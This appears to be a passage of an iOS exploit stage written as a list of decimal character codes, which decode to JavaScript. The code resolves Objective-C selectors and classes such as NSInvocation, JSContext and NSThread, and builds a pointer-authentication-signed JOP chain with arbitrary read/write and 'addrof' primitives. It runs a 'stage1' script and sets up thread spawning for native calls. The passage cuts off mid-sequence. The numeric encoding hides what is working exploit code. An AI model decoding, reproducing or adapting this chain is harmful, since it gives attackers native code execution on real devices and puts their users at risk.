59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 108, 101, 97, 115, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 101, 108, 101, 97, 115, 101, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 58, 97, 116, 73, 110, 100, 101, 120, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 116, 97, 114, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 115, 116, 97, 114, 116, 34, 41, 41, 59, 10, 10, 108, 101, 116, 32, 105, 110, 118, 111, 107, 101, 95, 99, 108, 97, 115, 115, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 78, 83, 73, 110, 118, 111, 99, 97, 116, 105, 111, 110, 34, 41, 59, 10, 108, 101, 116, 32, 106, 115, 99, 95, 99, 108, 97, 115, 115, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 74, 83, 67, 111, 110, 116, 101, 120, 116, 34, 41, 59, 10, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 99, 108, 97, 115, 115, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 78, 83, 84, 104, 114, 101, 97, 100, 34, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 99, 115, 116, 114, 105, 110, 103, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 107, 67, 70, 83, 116, 114, 105, 110, 103, 69, 110, 99, 111, 100, 105, 110, 103, 85, 84, 70, 56, 41, 59, 10, 125, 10, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 98, 111, 120, 101, 100, 95, 97, 114, 114, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 105, 115, 78, 97, 78, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 115, 78, 97, 78, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 119, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 34, 41, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 95, 99, 111, 112, 121, 40, 99, 102, 115, 116, 114, 105, 110, 103, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 108, 101, 97, 115, 101, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 111, 98, 106, 44, 32, 99, 102, 115, 116, 114, 95, 107, 101, 121, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 44, 32, 99, 102, 115, 116, 114, 95, 107, 101, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 40, 111, 98, 106, 44, 32, 106, 115, 99, 114, 105, 112, 116, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 44, 32, 106, 115, 99, 114, 105, 112, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 40, 111, 98, 106, 44, 32, 115, 101, 108, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 44, 32, 115, 101, 108, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 40, 111, 98, 106, 44, 32, 115, 105, 103, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 44, 32, 115, 105, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 111, 98, 106, 44, 32, 97, 114, 103, 44, 32, 105, 100, 120, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 44, 32, 97, 114, 103, 44, 32, 105, 100, 120, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 40, 111, 98, 106, 44, 32, 116, 97, 114, 103, 101, 116, 44, 32, 115, 101, 108, 44, 32, 111, 98, 106, 101, 99, 116, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 44, 32, 116, 97, 114, 103, 101, 116, 44, 32, 115, 101, 108, 44, 32, 111, 98, 106, 101, 99, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 116, 97, 114, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 117, 112, 95, 102, 99, 97, 108, 108, 95, 106, 111, 112, 99, 104, 97, 105, 110, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 32, 61, 32, 109, 97, 108, 108, 111, 99, 40, 80, 65, 71, 69, 95, 83, 73, 90, 69, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 61, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 49, 48, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 32, 61, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 50, 48, 48, 110, 59, 10, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 48, 110, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 56, 110, 44, 32, 112, 97, 99, 105, 97, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 44, 32, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 95, 67, 70, 79, 98, 106, 101, 99, 116, 67, 111, 112, 121, 80, 114, 111, 112, 101, 114, 116, 121, 44, 32, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 52, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 50, 44, 32, 48, 110, 41, 41, 59, 10, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 50, 48, 110, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 52, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 50, 56, 110, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 45, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 51, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 48, 120, 52, 49, 52, 49, 52, 49, 52, 49, 110, 44, 32, 48, 120, 67, 50, 68, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 53, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 102, 99, 97, 108, 108, 95, 49, 52, 95, 97, 114, 103, 115, 95, 119, 114, 105, 116, 101, 95, 120, 56, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 53, 48, 110, 41, 41, 59, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 32, 58, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 34, 32, 58, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 51, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 34, 32, 58, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 44, 10, 32, 32, 32, 32, 125, 59, 10, 125, 10, 10, 108, 101, 116, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 48, 110, 59, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 95, 115, 112, 97, 119, 110, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 32, 61, 32, 48, 120, 48, 110, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 116, 121, 112, 101, 111, 102, 32, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 61, 61, 61, 32, 34, 115, 116, 114, 105, 110, 103, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 41, 59, 10, 32, 32, 32, 32, 125, 32, 101, 108, 115, 101, 32, 105, 102, 32, 40, 116, 121, 112, 101, 111, 102, 32, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 61, 61, 61, 32, 34, 111, 98, 106, 101, 99, 116, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 125, 32, 101, 108, 115, 101, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 105, 110, 32, 116, 104, 105, 115, 32, 99, 97, 115, 101, 44, 32, 105, 116, 39, 115, 32, 97, 108, 114, 101, 97, 100, 121, 32, 97, 32, 67, 70, 83, 116, 114, 105, 110, 103, 44, 32, 115, 111, 32, 108, 101, 116, 39, 115, 32, 106, 117, 115, 116, 32, 99, 111, 112, 121, 32, 105, 116, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 95, 99, 111, 112, 121, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 32, 61, 32, 115, 101, 116, 117, 112, 95, 102, 99, 97, 108, 108, 95, 106, 111, 112, 99, 104, 97, 105, 110, 40, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 32, 32, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 34, 93, 59, 10, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 40, 106, 115, 99, 95, 99, 108, 97, 115, 115, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 118, 97, 108, 117, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 105, 115, 78, 97, 78, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 102, 117, 110, 99, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 105, 115, 110, 97, 110, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 97, 100, 100, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 105, 115, 110, 97, 110, 95, 102, 117, 110, 99, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 99, 111, 100, 101, 95, 112, 116, 114, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 105, 115, 110, 97, 110, 95, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 50, 56, 110, 59, 10, 32, 32, 32, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 115, 116, 97, 103, 101, 49, 95, 106, 115, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 97, 100, 100, 114, 111, 102, 32, 112, 114, 105, 109, 115, 10, 32, 32, 32, 32, 108, 101, 116, 32, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 98, 111, 120, 101, 100, 95, 97, 114, 114, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 98, 117, 116, 116, 101, 114, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 56, 110, 44, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 98, 117, 116, 116, 101, 114, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 114, 119, 54, 52, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 61, 32, 117, 